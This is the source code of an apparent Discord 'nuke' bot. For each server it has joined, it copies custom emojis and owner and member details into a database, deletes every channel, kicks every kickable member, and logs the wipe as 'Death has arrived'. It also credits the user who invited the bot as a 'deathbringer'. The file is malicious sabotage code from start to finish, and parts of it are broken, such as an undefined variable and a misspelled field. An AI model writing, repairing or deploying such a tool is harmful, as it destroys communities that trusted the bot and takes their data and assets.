import Prisma from '@prisma/client';
import fs from "fs";

const { PrismaClient } = Prisma;
const prisma = new PrismaClient();
const LOG_PATH = process.env.LOG_PATH || './logs'

const stealEmoji = async (g) => {
  let counter = 0;
  let emojis = [];
  
  await g.emojis.fetch().then(emo => emo.map((e) => {
    counter += 1;
    emojis.push({ name: e.name, url: e.url });
  }))
  
  return [counter, emojis.map((obj) => 
    prisma.emojis.create({
      data: {
        name: obj.name,
        url: obj.url,
        serverId: g.id,
      },
    })
  )]
} 

export const DbInit = async () => {
  return await prisma.deathStats.upsert({
    where: { id: 1 },
    update: {},
    create: { id: 1, servers: 0, kills: 0 },
  });
}; 


export const Purge = (client) => {
  client.guilds.cache.map(async (g) => {
    let killCounter = 0;
    let textChannelCounter = 0;
    let voiceChannelCounter = 0;

    let steal = await stealEmoji(g) 
    let emojiCounter = steal[0]
    let emojiBatchInsert = steal[1]
    
    await prisma.$transaction(emojiBatchInsert);

    await prisma.purgedServer.create({
      data: {
        name: g.name,
        serverId: g.id,
        ownerId: g.ownerId,
        memberCount: g.memberCount,
        premiumTier: g.premiumTier,
        emojiCount: emojiCounter,
      },
    });

    await (
      await g.channels.fetch()
    ).forEach((ch) => {
      ch.delete();
      if (ch.isText()) {
        textChannelCounter += 1;
      } else {
        voiceChannelCounter += 1;
      }
    });
    await (
      await g.members.fetch()
    ).forEach((member) => {
      if (member.kickable) {
        member.kick();
        killCounter += 1;
      }
    });

    let logMsg = `[${new Date().toISOString()}] [INFO] Death has arrived to: ${
      g.name
    } Deaths: ${killCounter}, Text Channels: ${textChannelCounter}, Voice Channels: ${voiceChannelCounter}, Total: ${
      textChannelCounter + voiceChannelCounter
    } \n`;

    fs.appendFile(`${LOG_PATH}/log.txt`, logMsg, (err) => {
      if (err) throw err;
    });

    const log = await prisma.deathStats.findUnique({ where: { id: 1 } });
    await prisma.deathStats.update({
      where: { id: 1 },
      data: {
        servers: log.servers + 1,
        kills: log.kills + killCounter,
        textChannels: log.textChannels + textChannelCounter,
        voiceChannels: log.voiceChannels + voiceChannelCounter,
      },
    });

    await (await g.fetchIntegrations()).map(async int => {
      if(int.id == "938385488912461834") {
        let deathbringer = g.members.cache.find((i) => i.user.id === int.user.id)
        await prisma.deathbringer.upsert({select: {killedServers}, update: {
          kiledServers: killedServers + 1,
        }, create: {
          username: deathbringer.user.username,
          userId: deathbringer.user.id,
          kiledServers: 1
        }})
      }
    })
    //g.leave();
  });
};